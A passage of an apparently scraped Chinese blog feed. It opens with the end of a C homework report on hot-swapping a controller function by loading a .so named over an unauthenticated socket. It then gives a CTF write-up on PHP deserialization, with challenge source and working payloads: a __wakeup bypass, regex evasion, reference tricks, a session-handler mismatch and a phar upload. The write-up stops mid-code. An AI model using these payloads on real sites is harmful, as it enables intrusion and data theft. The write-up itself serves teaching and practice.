so file for emergency situation\n&quot;);            len=send(client_skt,reply_verify,strlen(reply_verify),0);            memset(buf,&#39;\0&#39;,sizeof(buf));            len=recv(client_skt,buf,sizeof(buf),0);            strtok(buf,&quot;\n&quot;);            memcpy(new_file_path,dir_path,sizeof(dir_path));            strcat(new_file_path,buf);            initialize_status=0;        &#125;        memset(buf,&#39;\0&#39;,sizeof(buf));        close(client_skt);    &#125;&#125;int check_so()&#123;    old_control_function=control_function;    void *handle = dlopen((char *) dllPath, RTLD_LAZY);    if(no_load==0)    &#123;        printf(&quot;%s\n&quot;,new_file_path);        handle=dlopen((char *)new_file_path,RTLD_LAZY);    &#125;    if(!handle)    &#123;        printf(&quot;Error occurred while trying to load so file\n&quot;);        return -1;    &#125;    control_function=dlsym(handle,&quot;control_function&quot;);    if(!control_function)    &#123;        printf(&quot;error occurred while load the function\n&quot;);        return -1;    &#125;    if(no_load==0)    &#123;        reload_status=1;    &#125;    no_load=0;    return 0;&#125;int main()&#123;    unsigned t = 0;    double u;    pthread_t thread[1];    int res = pthread_create(&amp;thread[0], NULL, Listener,NULL);    while(1)    &#123;        if(initialize_status==0) // reload module        &#123;            if(check_so()!=0)            &#123;                if(no_load==1)                &#123;                    printf(&quot;Failed to initializing so file&quot;);                    return 0;                &#125;else                &#123;                    printf(&quot;Something went wrong while trying to replace so file\n&quot;);                &#125;            &#125;else printf(&quot;so file loaded successfully\n&quot;);            initialize_status=1;        &#125;        if(reload_status==1) // if reloaded so file enter progressive mode        &#123;            double temp1,temp2;            double mix_value;            old_control_function(t, &amp;temp1);            control_function(t, &amp;temp2);            printf(&quot;old function run result as %lf\n&quot;,temp1);            printf(&quot;new function run result as %lf\n&quot;,temp2);            mix_value=(1-cnt)*temp1+cnt*temp2;  // generate progressive value            cnt+=0.1;            printf(&quot;Progressive value for Emergency substitution is %lf @ %u\n&quot;, mix_value, t);            if(cnt&gt;=1)            &#123;                printf(&quot;progressive stage end here\n&quot;);                reload_status=0;   // end of progressive substitution            &#125;            t++;                              // Increment time index            sleep(1);            continue;        &#125;        if(control_function(t, &amp;u) == -1)        &#123;            printf(&quot;control_function failed\n&quot;);            exit(-1);        &#125;        printf(&quot;%lf @ %u\n&quot;, u, t);               // simulate input as u        t++;                              // Increment time index        sleep(1);             // Sampling time... maybe 10-15 minutes in practice    &#125;    return 0;                     // Should never reach here!&#125;                           // main())//gcc main.c -o -dl</code></pre><p>contrller.c (老的温度函数)</p><pre><code>#include &lt;math.h&gt;int control_function(const unsigned k, double* u)&#123;    *(u) = sin((double)k / 50.0);          // simulate input algorithm    return 0;&#125;//gcc -fPIC -shared controller.c -o controller.so -lm</code></pre><p>new_controller.c（新的温度函数）</p><pre><code>int control_function(const unsigned k, double* u)&#123;    *(u) = 3.141592;          // simulate input algorithm    return 0;&#125;//gcc -fPIC -shared new_controller.c -o new_controller.so -lm</code></pre><p>将函数源代码提前编译成动态链接库，在main.c启动后会默认加载controller.so文件，当程序监听到socket被链接，确认需要更换并得到文件名new_controller.so后便会在工作目录加载，同时温度值会为</p><p><img src="http://106.15.74.181/wp-content/uploads/2021/03/%E5%9B%BE%E7%89%87.png"></p><p>其中λ是和时间相关的系数，这样便可以做到渐进式替换的效果。</p><hr><p>具体的报告</p><h3 id="course-exercise"><a href="#course-exercise" class="headerlink" title="course-exercise"></a>course-exercise</h3><h4 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h4><p>Detailed the function and how it does</p><p><img src="http://106.15.74.181/wp-content/uploads/2021/03/Industrial-Controller-1024x362.png"></p><h4 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h4><h5 id="Using-memcpy-function"><a href="#Using-memcpy-function" class="headerlink" title="-Using memcpy function"></a>-Using memcpy function</h5><p>I assume the program is designed for a chemical industry machine which need the program to generate output to control the temperature. Maybe at one point the machine need to adjust the temperature function and during the process of substitution . This process can be regarded as a Hot Fix. To achieve this I came out many methods such as start another program from the previous one, recompile the program. And The Linux kernel has a function replacement function, such as the memcpy function. There are various versions. The performance of different versions is different in different CPUs. When the kernel starts, it will patch dynamically according to the type of CPU. The method is to add an empty instruction at the beginning of the memcpy function. The length of the instruction can put down a jump instruction. X86 has different lengths of empty instructions. Then, according to the specific CPU, select the fastest version of memcpy and jump to the new function. In this way, new and old code can coexist and jump to new code with jump command.</p><p><img src="https://www.ibm.com/developerworks/cn/linux/l-knldebug/images/2.gif" alt="img"></p><p>And to keep that work.</p><p>(1) When the original function is being replaced, that is, when the replacement core module is inserted, it is not used by other processes, otherwise the result may cause the phenomenon of inconsistent kernel state.</p><p>(2) The replacement function and the original function have the same parameter list, and the corresponding order of parameter types are the same, the number of parameters is the same, and the function has the same return value. In general, the purpose of replacing a core function is not to change its function, but to track whether the execution flow of the function is abnormal, and whether the variables and parameters have the expected values. Therefore, the replacement function and the original function have the same function.</p><p>To get the address of the function we need to know. We need to customize our own replacement function before we can replace it, and we must be able to find the address of the replacement function in the runtime core (via System.map or /proc/ksyms). In addition, before replacing the function on the target computer, it is best to first pass the test on other nodes with the same hardware platform and operating system core, because the replacement function written by oneself often has some problems and can not pass at one time, so as not to cause unnecessary trouble.</p><p>The purpose or desired effect of dynamically replacing the kernel content is to change the original execution flow of the kernel and to jump to our own custom function flow. As you can see from the schematic of the above function call, there are three places to start with function replacement.</p><p>(1) Modify the stack</p><p>However, this method can only modify the parameters and return address of the function execution, and can not achieve the purpose of changing the execution process;</p><p>(2) Modify the content of the program counter</p><p>There is no way to assign EIP directly within the operating system and no such code is provided.</p><p>(3) modify the original function code</p><p>When a function is called, the value of eip will point to the starting address of the code of the called function, and the value of the next point of eip will be determined based on the first instruction of the function. So we can change the first part of the original function code to jump the contents of the eip to the alternative function code we provide, without leaving the existing stack content unchanged.</p><p>There are two instructions in the instruction set that can jump the execution flow of a program: CALL and JMP.</p><p>Call is a function call instruction. Before a call can be executed, we need to set the parameters of the function on the stack. In this case, because the parameters have been set before entering the original function, we must copy these parameters to the top of the stack. This copying process involves stack addresses related to the number of arguments, so different functions need to be recalculated, more prone to error.</p><p>JMP makes a normal jump (similar to the GOTO statement in C language), and can continue to use the arguments prepared by the original function and the return address information, without having to copy the contents of the stack again, so it is relatively safe and convenient to implement.</p><p><img src="https://www.ibm.com/developerworks/cn/linux/l-knldebug/images/2.gif" alt="img"></p><p>The whole replacement process is completed by a core module. When the core module initializes, it replaces the instruction code at the beginning of the original function func with the jump instruction code, making this part of the code become an instruction to the function replace_func. At the same time to finally be able to restore function func, antiderivatives instruction code of the substituted part must be preserved, so that when we achieve the desired purpose after uninstall the module, can be used to save the order code to cover the original address, so that when the subsequent kernel executive function func again, they can continue to perform the function of the original code, does not destroy the kernel of the state.</p><h5 id="Livepatch"><a href="#Livepatch" class="headerlink" title="-Livepatch"></a>-Livepatch</h5><p>Livepatch is a tool for hotpatching run-time processes. It can easily modify the variables in the running process, but also can easily replace the functions in the running process, using a new library function to replace the original function in the main process.</p><ul><li>  Kernel probes（Kprobes）</li><li>  Function tracing（Ftrace）</li><li>  Livepatching（livepatch）</li></ul><p>And not all the system support this mechanism the supported OS are as followed:</p><ul><li>  Arch Linux（livepatch，kpatch-git tool）</li><li>  Debian（Debian 9）</li><li>  Gentoo（<a href="https://links.jianshu.com/go?to=https://wiki.gentoo.org/wiki/Live_patching">kpatch or ksplice</a>）</li><li>  Oracle Linux（ksplice）</li><li>  RedHat Linux 7（kpatch or ksplice）</li><li>  SUSE（kGraft）</li><li>  Ubuntu 16.04 or higher（livepatch）</li></ul><p>If we take this method as a resolution. We will have to consider the following problems.</p><ul><li>  We want to be able to change the behavior of our program while it is running.</li><li>  How new program behavior is dynamically added to process memory. We want to be able to change the behavior of our program while it is running.</li><li>  How to replace the behavior of a function with a new behavior.</li><li>  If the function you need to change is static, can you change it this way?</li><li>  How can a new function call other functions in the original process? How do I access existing global variables? How do I access static functions and static global variables? If the function you need to change is static, can you change it this way?</li></ul><h5 id="Final-Call"><a href="#Final-Call" class="headerlink" title="-Final Call"></a>-Final Call</h5><p>So all of these can be considered as disadvantages of manually replace the ole function with the new one. It is hard and may cause unstableness or other problems that may be unexpected.</p><p>On this condition I think using DLL is the easiest way to solve this. Under Unix OS environment I use dlfcn,h to load and use the external .so file. And by using the Unix system function such as Socket and dlfcn part. All of these are widely used in embedded system.</p><h4 id="Detail"><a href="#Detail" class="headerlink" title="Detail"></a>Detail</h4><p>At the out set of the detail report. I want to make it clear that I achieve the goal of the exercise using DLL(Dynamic Linking Lib) Module and socket communication. The program will dynamically load the function form the specified .so file. The timing of changing the .so file to replace the old function and old .so file is controlled by the socket module. So basically, the program listening on port 9000 for signal of hot fix request, when receive the signal it will try to load the new so file. If nothing goes wrong, the program will go to progressive introduce stage which using the function</p><p><img src="http://106.15.74.181/wp-content/uploads/2021/03/%E5%9B%BE%E7%89%87.png"></p><p>u is a mix value using the old controller function and new controller function which will make the procedure more smooth. As for the error part, the program has its mechanism of error caught part, if the default .so file cannot be loaded the program will go end directly. But if the new .so file fail to load the whole program will use the initial .so file and keep everything unchanged. So in the case of one thread for main situation this program can keep the control algorithm to steadily changed without any error that may result the stop of the control program.</p><pre><code>The function dlopen() loads the dynamic shared object (shared       library) file named by the null-terminated string filename and       returns an opaque &quot;handle&quot; for the loaded object.  This handle is       employed with other functions in the dlopen API, such as       dlsym(3), dladdr(3), dlinfo(3), and dlclose().</code></pre><pre><code>The function dlsym() takes a &quot;handle&quot; of a dynamic loaded shared       object returned by dlopen(3) along with a null-terminated symbol       name, and returns the address where that symbol is loaded into       memory.  If the symbol is not found, in the specified object or       any of the shared objects that were automatically loaded by       dlopen(3) when that object was loaded, dlsym() returns NULL.       (The search performed by dlsym() is breadth first through the       dependency tree of these shared objects.)       In unusual cases (see NOTES) the value of the symbol could       actually be NULL.  Therefore, a NULL return from dlsym() need not       indicate an error.  The correct way to distinguish an error from       a symbol whose value is NULL is to call dlerror(3) to clear any       old error conditions, then call dlsym(), and then call dlerror(3)       again, saving its return value into a variable, and check whether       this saved value is not NULL.</code></pre><pre><code>  socket() creates an endpoint for communication and returns a file       descriptor that refers to that endpoint.  The file descriptor       returned by a successful call will be the lowest-numbered file       descriptor not currently open for the process.       The domain argument specifies a communication domain; this       selects the protocol family which will be used for communication.       These families are defined in &lt;sys/socket.h&gt;.  The formats       currently understood by the Linux kernel include:</code></pre><p>JUST USING THE ON HAND FUNCTION IS ABSOLUTELY BETTER CHOICE</p><p>that’s why I USE THIS WAY</p><h3 id="Screenshot"><a href="#Screenshot" class="headerlink" title="Screenshot"></a>Screenshot</h3><ul><li>  Default .so loading</li></ul><p><img src="http://106.15.74.181/wp-content/uploads/2021/03/image-20210205160729053-1024x597.png"></p><ul><li>  How to change .so file use <code>nc 127.0.0.1 9000</code> as a signal to contact socket listener</li></ul><p><img src="http://106.15.74.181/wp-content/uploads/2021/03/image-20210205160909274-1024x490.png"></p><ul><li>  .so reload and progressive introduce start</li></ul><p><img src="http://106.15.74.181/wp-content/uploads/2021/03/image-20210205160952768.png"></p><p>The old function keep working and generating output continuously during the reload process</p><p>THE WHOLE PROCESS CAN BE SEEN ABOVE or you you seek deeper <em>JUST CHECK</em> the source code at the out set of the report</p><ul><li>  End of progressive introduce stage</li></ul><p><img src="http://106.15.74.181/wp-content/uploads/2021/03/image-20210205161211343.png"></p><p>You can easily see what happen above , if you seek more just run the program within the whole package plz.</p><p>After that the output will only be generated by the newly replaced function</p><hr><p>通过这次小作业，学习了dll的载入，c的socket编写，并对这种动态替换，热更新技术做了有限且初步的了解</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;寒假皮条侠给了我个单子需求大概是这样&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://106.15.74.181/wp-content/uploads/2021/03/Assignment_2020-21-1.pdf&quot;&gt;英文原版&lt;br&gt;Assignment_2020-21-1</summary>
      
    
    
    
    <category term="c语言学习" scheme="https://zwh-china.github.io/categories/c%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>php反序列化在CTF中的应用</title>
    <link href="https://zwh-china.github.io/2021/03/30/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9C%A8ctf%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    <id>https://zwh-china.github.io/2021/03/30/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9C%A8ctf%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</id>
    <published>2021-03-30T09:27:40.000Z</published>
    <updated>2021-04-20T21:15:38.469Z</updated>
    
    <content type="html"><![CDATA[<p>​</p><hr><p>​</p><p>​ <strong>本文假设读者对于php面向对象有一定了解</strong></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h4 id="什么是反序列化"><a href="#什么是反序列化" class="headerlink" title="什么是反序列化"></a>什么是反序列化</h4><pre><code>序列化 (Serialization)是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。</code></pre><p>这种官方解释往往对初学反序列化的朋友造成一定困扰</p><pre><code>序列化的定义:序列化：把对象转化为可传输的字节序列过程称为序列化。反序列化：把字节序列还原为对象的过程称为反序列化。</code></pre><h4 id="为什么要序列化？"><a href="#为什么要序列化？" class="headerlink" title="为什么要序列化？"></a>为什么要序列化？</h4><pre><code>其实序列化最终的目的是为了对象可以跨平台存储，和进行网络传输。而我们进行跨平台存储和网络传输的方式就是IO，而我们的IO支持的数据格式就是字节数组。因为我们单方面的只把对象转成字节数组还不行，因为没有规则的字节数组我们是没办法把对象的本来面目还原回来的，所以我们必须在把对象转成字节数组的时候就制定一种规则（序列化），那么我们从IO流里面读出数据的时候再以这种规则把对象还原回来（反序列化）。如果我们要把一栋房子从一个地方运输到另一个地方去，序列化就是我把房子拆成一个个的砖块放到车子里，然后留下一张房子原来结构的图纸，反序列化就是我们把房子运输到了目的地以后，根据图纸把一块块砖头还原成房子原来面目的过程</code></pre><p>摘自知友-<a href="https://www.zhihu.com/people/duan-pan-ykjym">勤劳的小手</a></p><p>再简单点说就是，当你想把一个数组通过网络传输到另一端并在另一端还原成原数组，你可以通过序列化/反序列化的操作来完成。最常见的json便是序列化/反序列化的代表</p><h4 id="php-unserialize函数原型和官方定义"><a href="#php-unserialize函数原型和官方定义" class="headerlink" title="php unserialize函数原型和官方定义"></a>php unserialize函数原型和官方定义</h4><pre><code> unserialize ( string $str ) : mixed</code></pre><p>unserialize函数接受一个str类型的参数，返回类型可能是多种类型例如数组/对象</p><h4 id="序列化字符串的格式"><a href="#序列化字符串的格式" class="headerlink" title="序列化字符串的格式"></a>序列化字符串的格式</h4><p>Type</p><p>Serialization examples</p><p>Null</p><p><code>N;</code></p><p>Boolean</p><p><code>b:1;</code> <code>b:0;</code></p><p>Integer</p><p><code>i:685230;</code> <code>i:-685230;</code></p><p>Floating point</p><p><code>d:685230.15;</code> <code>d:INF;</code> <code>d:-INF;</code> <code>d:NAN;</code></p><p>String</p><p><code>s:6:&quot;A to Z&quot;;</code></p><p>Associative array</p><p><code>a:4:&#123;i:0;b:1;i:1;N;i:2;d:-421000000;i:3;s:6:&quot;A to Z&quot;;&#125;</code> <code>a:2:&#123;i:42;b:1;s:6:&quot;A to Z&quot;;a:3:&#123;i:0;i:1;i:1;i:2;i:2;i:3;&#125;&#125;</code></p><p>Object</p><p><code>O:8:&quot;stdClass&quot;:2:&#123;s:4:&quot;John&quot;;d:3.14;s:4:&quot;Jane&quot;;d:2.718;&#125;</code></p><p>那我们选取两歌比较有代表性的序列化字符串来进行解析</p><ul><li>  <code>a:4:&#123;i:0;b:1;i:1;N;i:2;d:-421000000;i:3;s:6:&quot;A to Z&quot;;&#125;</code></li></ul><p>这里的<code>a</code>代表<code>Associative array</code>也就是关联形数组，4代表这个 序列化字符串中包含四个元素，再看花括号内的内容，i表示数组的索引(index)，其中出现了b N d等字母这代表元素的类型，参考上表，b:1是代表布尔值True，N代表NULL，d:-42100000代表浮点数，s:”A to Z”代表字符串</p><p><img src="http://106.15.74.181/wp-content/uploads/2021/03/QQ%E5%9B%BE%E7%89%8720210325163315.png"></p><ul><li>  <code>O:8:&quot;stdClass&quot;:2:&#123;s:4:&quot;John&quot;;d:3.14;s:4:&quot;Jane&quot;;d:2.718;&#125;</code></li></ul><p>这里O代表<code>Object</code>也就是对象，stdClass是类的名字，8表示类名长度，2表示这个对象有两个属性</p><p><img src="http://106.15.74.181/wp-content/uploads/2021/03/QQ%E5%9B%BE%E7%89%8720210325163824-1024x238.png"></p><p>当然上面的表并不是完整的</p><p>Symbol</p><p>Data Type</p><p>Description</p><p>Example</p><p>N</p><p>null</p><p>A NULL value</p><p>N;</p><p>b</p><p>bool</p><p>The value can either be true(1) or false(0)</p><p>b:1;</p><p>i</p><p>int</p><p>Numeric value</p><p>i:1337;</p><p>d</p><p>double</p><p>Double value. Value can be provided as a normal floating value or as E value. (e.g. 1.234E+20). There are three special values: INF -INF NAN</p><p>d:1.337; d:1.3333333E+20</p><p>s</p><p>string</p><p>A serialized string contains the string length and the actual string surrounded by double quotes</p><p>s:4:”meow”;</p><p>S</p><p>encoded string</p><p>The encoded string is very similar to the normal string. The difference is that characters can be hex encoded: A = \41 . This type allows to make the serialized string printable and is very useful in case the server rejects certain characters</p><p>S:5:”me\00ow”;</p><p>a</p><p>array</p><p>The array size is defined first. The actual content remains between the {} and must be provided as key value pairs.</p><p>a:1:{i:0;s:5:”value”;}</p><p>O</p><p>Object</p><p>Objects have the class name at the beginning followed by the property definitions. Similar to arrays key-value pairs are required here. Properties can either be public private or protected. A public property only requires to set the actual property name. For private and static properties some extra information must be prefixed: Following list shows how a property named test is encoded for different visibilities: public: test private: \x00Classname\x00test protected: \x00*\x00test</p><p>O:8:”stdClass”:1:{s:4:”test”;i:123;}</p><p>C</p><p>Custom Object</p><p>Several classes use a custom unserializer and require to use the C symbol. Similar to a normal object the class name is defined first and is followed by the custom serialized string. Contrary to a normal object the number before the custom content defines the length of the custom content instead of the number of properties.</p><p>C:11:”ArrayObject”:21:{x:i:0;a:0:{};m: a:0:{}}</p><p>r</p><p>reference</p><p>A reference to an existing value in the serialized string.</p><p>r:1;</p><p>R</p><p>reference</p><p>A reference to an existing value in the serialized string. The is_reference attribute of the zval is set</p><p>R:1;</p><p>o</p><p>wtf object</p><p>The purpose of the lowercase o is unclear. It represents an object but it is not possible to set the class name (defaults to stdClass). The misplaced “ in the sample is not a typo.</p><p>o:1:”s:4:”prop”;i:1;}</p><h2 id="那序列化在CTF中有什么应用呢"><a href="#那序列化在CTF中有什么应用呢" class="headerlink" title="那序列化在CTF中有什么应用呢"></a>那序列化在CTF中有什么应用呢</h2><p>先看题</p><ul><li>  un1</li></ul><pre><code>&lt;!-un1.php--&gt;&lt;?php class SoFun&#123;   protected $file=&#39;index.php&#39;;  function __destruct()&#123;    if(!empty($this-&gt;file)) &#123;      if(strchr($this-&gt; file,&quot;\\&quot;)===false &amp;&amp;  strchr($this-&gt;file, &#39;/&#39;)===false)        show_source(dirname (__FILE__).&#39;/&#39;.$this -&gt;file);      else        die(&#39;Wrong filename.&#39;);    &#125;  &#125;    function __wakeup()&#123;   $this-&gt;file=&#39;index.php&#39;;  &#125; &#125;     if (!isset($_GET[&#39;tryhackme&#39;]))&#123;   show_source(__FILE__);&#125;else&#123;   $a=$_GET[&#39;tryhackme&#39;];   unserialize($a); &#125; ?&gt;&lt;!--key in flag1.php--&gt;</code></pre><p>显然我们需要通过析构函数的<code>show_source</code>函数来显示<code>flag1.php</code> 但是其中的<code>wakeup</code>魔法函数会在反序列化对象时将其中的<code>file</code>属性改成<code>index.php</code> 所以这个题的难点就在于如何绕过<code>wakeup</code>函数。<code>wakeup</code>的绕过是利用修改对象个数绕过，在前面我们讲了序列换字符串的每个部分意义后我们便知道对象名后的数字代表序列化对象中元素个数，当元素实际个数小于序列化串中指定个数时，这个序列化串仍会被反序列化，但是其将不会触发<code>wakeup</code>函数<code>(CVE-2016-7124 PHP before 5.6.25 and 7.x before 7.0.10)</code></p><p><code>payload:?tryhackme=O:5:&quot;SoFun&quot;:2:&#123;S:7:&quot;\00*\00file&quot;;s:9:&quot;flag1.php&quot;;&#125;</code>此处\00也可换为%00</p><ul><li>  un2</li></ul><pre><code> &lt;!-un2.php--&gt; &lt;?phpinclude &quot;flag2.php&quot;; class funny&#123;    function __wakeup()&#123;        global $flag;        echo $flag;    &#125;&#125;if (isset($_GET[&#39;tryhackme&#39;]))&#123;    $a = $_GET[&#39;tryhackme&#39;];    if(preg_match(&#39;/[oc]:\d+:/i&#39;, $a))&#123;        die(&quot;NONONO!&quot;);    &#125; else &#123;        unserialize($a);    &#125;&#125; else &#123;    show_source(__FILE__);&#125; ?&gt; </code></pre><p>这道题主要是序列化字符串的特殊构造来绕过正则表达式的匹配。常见可以通过使用+号来进行绕过(注意此处+应采用url编码%2b来防止被默认解析为空格)</p><p><code>payload:?tryhackme=O:%2b5:&quot;funny&quot;:0:&#123;&#125;</code></p><ul><li>  un3</li></ul><pre><code> &lt;!-un3.php--&gt;&lt;?phpinclude &quot;flag3.php&quot;; class funny&#123;    private $password;    public $verify;    function __wakeup()&#123;        global $nobodyknow;        global $flag;        $this-&gt;password = $nobodyknow;        if ($this-&gt;password === $this-&gt;verify)&#123;            echo $flag;        &#125; else &#123;            echo &quot;Hacking??!&quot;;        &#125;    &#125;&#125;if (isset($_GET[&#39;tryhackme&#39;]))&#123;$a = $_GET[&#39;tryhackme&#39;];unserialize($a);&#125; else &#123;    show_source(__FILE__);&#125;?&gt;</code></pre><p>可以看到想要拿flag就必须通过<code>wakeup</code>函数，此处考点显然不再是<code>wakeup</code>函数的绕过。可以看到<code>nobodyknow</code>这个变量我们是不可控的。但是想要拿到flag我们必须让verify这个变量等于<code>nobodyknow</code>这时我们可以考虑使用引用，让verify的值为对password的引用这样两个变量的值就恒定相等了</p><p><code>payload:?tryhackme=O:5:&quot;funny&quot;:2:&#123;s:15:&quot;%00funny%00password&quot;;N;s:6:&quot;verify&quot;;R:2;&#125;</code></p><ul><li>  un4</li></ul><pre><code> &lt;!-un4.php--&gt; &lt;?php// goto un42.phpini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);session_start();if (isset($_GET[&#39;tryhackme&#39;]))&#123;$_SESSION[&#39;tryhackme&#39;] = $_GET[&#39;tryhackme&#39;];&#125; else &#123;show_source(__FILE__);&#125;?&gt; </code></pre><pre><code> &lt;!-un42.php--&gt; &lt;?phpinclude &quot;flag4.php&quot;; ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;);session_start();class funny&#123;    public $a;    function __destruct()&#123;        global $flag;        echo $flag;    &#125;&#125;show_source(__FILE__);?&gt; </code></pre><p>这个题应用了php反序列化引擎使用不一致导致的漏洞，可以注意到两个php页面使用的反序列化引擎是不同的，前者用的是<code>php_serialize</code>后者则是<code>php</code>具体的漏洞利用就是通过构造payload，使得session在被反序列后得到类funny。具体可以参考Spoock的blog<code>https://blog.spoock.com/2016/10/16/php-serialize-problem/</code></p><p>具体到这题的<code>payload:?tryhackme=O:5:&quot;funny&quot;:1:&#123;s:1:&quot;a&quot;;N;&#125;</code></p><ul><li>  un5</li></ul><pre><code> &lt;!-un5.php--&gt; &lt;?phpinclude &quot;flag5.php&quot;;class funny&#123;    private $a;    function __construct() &#123;        $this-&gt;a = &quot;givemeflag&quot;;    &#125;    function __destruct() &#123;        global $flag;        if ($this-&gt;a === &quot;givemeflag&quot;) &#123;            echo $flag;        &#125;    &#125;&#125;if (isset($_GET[&#39;tryhackme&#39;]) &amp;&amp; is_string($_GET[&#39;tryhackme&#39;]))&#123;$a = $_GET[&#39;tryhackme&#39;];for($i=0;$i&lt;strlen($a);$i++)&#123;    if (ord($a[$i]) &lt; 32  ord($a[$i]) &gt; 126) &#123;        die(&quot;hacker!&quot;);    &#125;&#125;unserialize($a);&#125; else &#123;    show_source(__FILE__);&#125;?&gt; </code></pre><p>可以看到，题目对反序列化字符串的内容进行了过滤不允许反序列化字符串中存在不可见字符。但是由于类中的$a是private属性。所以在构造序列化串时难以避免使用不可见字符，此处我们需要使用S，来进行绕过，即编码字符串</p><p><code>payload:?tryhackme=O:5:&quot;funny&quot;:1:&#123;S:8:&quot;\00funny\00a&quot;;s:10:&quot;givemeflag&quot;;&#125;</code></p><p>此处如果使用小写s并使用%00就会在payload被urldecode后被检测拦截 故使用大写S进行hex code后使用\00进行绕过处理</p><p>这样%00就会被转义进而符合要求</p><ul><li>  un6</li></ul><pre><code>  &lt;!-un6.php--&gt; &lt;?phpinclude &quot;flag6.php&quot;;ini_set(&#39;display_errors&#39;,true);error_reporting(E_ALL  E_STRICT); class funny&#123;    public function pyflag()&#123;        global $flag;        echo $flag;    &#125;&#125;if (isset($_GET[&#39;tryhackme&#39;]) &amp;&amp; is_string($_GET[&#39;tryhackme&#39;]))&#123;$a = unserialize($_GET[&#39;tryhackme&#39;]);$a();&#125; else &#123;    show_source(__FILE__);&#125;?&gt;</code></pre><p>这道题其实应用了php动态执行函数的能力，即使用变量名后加括号的方式来对函数进行调用。这道题其实是让$a为funny.pyflag</p><p><code>payload:?tryhackme=a:2:&#123;i:0;O:5:&quot;funny&quot;:0:&#123;&#125;i:1;s:6:&quot;pyflag&quot;;&#125;</code></p><ul><li>  un7</li></ul><pre><code>  &lt;!-un7.php--&gt; &lt;?phpinclude &quot;flag7.php&quot;;class funny&#123;    function __destruct() &#123;        global $flag;        echo $flag;    &#125;&#125;show_source(__FILE__);if (isset($_GET[&#39;action&#39;])) &#123;    $a = $_GET[&#39;action&#39;];    if ($a === &quot;check&quot;) &#123;        $b = $_GET[&#39;file&#39;];        if (file_exists($b) &amp;&amp; !empty($b)) &#123;            echo &quot;$b is exist!&quot;;        &#125;    &#125; else if ($a === &quot;upload&quot;) &#123;        if (!is_dir(&quot;./upload&quot;))&#123;            mkdir(&quot;./upload&quot;);        &#125;        $filename = &quot;./upload/&quot;.rand(1, 10000).&quot;.txt&quot;;        if (isset($_GET[&#39;data&#39;]))&#123;            file_put_contents($filename, base64_decode($_GET[&#39;data&#39;]));            echo &quot;Your file path:$filename&quot;;        &#125;    &#125;&#125;?&gt; </code></pre><p>这题没有反序列化，却需要得到一个funny对象。那我们就可以考虑用phar。</p><pre><code>poc.php&lt;?phpclass funny&#123;    function __destruct() &#123;        global $flag;        echo $flag;    &#125;&#125;$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;longlongNB&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub    $o = new funny();    $phar-&gt;setMetadata($o);//将自定义的meta-data存入manifest    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件    //签名自动计算    $phar-&gt;stopBuffering();$a=file_get_contents(&#39;./phar.phar&#39;);file_put_contents(&#39;./testphar&#39;,base64_encode($a));</code></pre><p>上传后利用check并使用协议phar来进行触发反序列化</p><p>上传<code>payload:?action=upload&amp;data=bG9uZ2xvbmdOQjw/cGhwIF9fSEFMVF9DT01QSUxFUigpOyA/Pg0KRgAAAAEAAAARAAAAAQAAAAAAEAAAAE86NToiZnVubnkiOjA6e30IAAAAdGVzdC50eHQEAAAAQd52XwQAAAAMfn/YtgEAAAAAAAB0ZXN0KfXmrUUr6s38dEJVz9DlBTNhvwcCAAAAR0JNQg==</code><br>触发<code>payload:?action=check&amp;file=phar://./upload/xxxx.txt</code></p><p>这个也是个挺典型的phar漏洞，不过现在一般站点的phar默认都是关闭的，在本地测试的时候我注意到了这点。题目简单直白只要能反序列化一个funny对象就可以爆出flag，可是没有常规的unserialize，那这样就显然是利用phar，看代码，把64decode的内容扔进一个txt文件，那么在本地我们只需要，新建一个phar中让他存上随意一个funny对象即可</p><ul><li>  un8</li></ul><pre><code>  &lt;!-un8.php--&gt; &lt;?phpinclude(&quot;./flag8.php&quot;);class a &#123;    public $object;    public function resolve() &#123;        array_walk($this, function($fn, $prev)&#123;            if ($fn[0] === &quot;system&quot; &amp;&amp; $prev === &quot;ls&quot;) &#123;                echo &quot;Wow, you rce me! But I can&#39;t let you do this. There is the flag. Enjoy it:)\n&quot;;                global $flag;                echo $flag;            &#125;        &#125;);    &#125;    public function __destruct() &#123;        @$this-&gt;object-&gt;add();    &#125;    public function __toString() &#123;        return $this-&gt;object-&gt;string;    &#125;&#125;class b &#123;    protected $filename;    protected function addMe() &#123;        return &quot;Add Failed. Filename:&quot;.$this-&gt;filename;    &#125;    public function __call($func, $args) &#123;        call_user_func([$this, $func.&quot;Me&quot;], $args);    &#125;&#125;class c &#123;    private $string;    public function __construct($string) &#123;        $this-&gt;string = $string;    &#125;    public function __get($name) &#123;        $var = $this-&gt;$name;        $var[$name]();    &#125;&#125;if (isset($_GET[&quot;tryhackme&quot;])) &#123;    unserialize($_GET[&#39;tryhackme&#39;]);&#125; else &#123;    